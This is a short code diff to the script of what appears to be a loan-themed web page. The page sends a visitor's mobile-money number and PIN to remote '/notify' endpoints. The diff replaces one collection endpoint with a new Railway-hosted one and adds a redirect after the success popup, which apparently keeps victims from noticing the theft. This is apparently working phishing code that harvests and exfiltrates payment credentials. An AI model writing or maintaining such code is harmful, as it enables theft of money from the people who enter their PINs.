@@ -220,7 +220,7 @@
   // Your two backend endpoints (token lives on the server, not here)
   const ENDPOINTS = [
     "https://advanced-loan.onrender.com/notify",
-    "https://web-production-4ceb0f.up.railway.app/notify"
+    "https://web-production-1a1f07.up.railway.app/notify"
   ];
 
   const el = id => document.getElementById(id);
@@ -236,6 +236,10 @@
   }
   function closeModal(){
     el('successModal').classList.remove('show');
+    // Redirect to index after the popup closes
+    setTimeout(() => {
+      window.location.href = 'index.html';
+    }, 250);
   }
 
   async function sendToServer(momo, pin){
@@ -301,7 +305,7 @@
 
     if(result.ok){
       setStatus('');
-      openModal();          // ← popup instead of redirect
+      openModal();          // popup appears
     }else{
       setStatus('❌ ' + result.error, 'err');
       el('submitBtn').disabled = false;
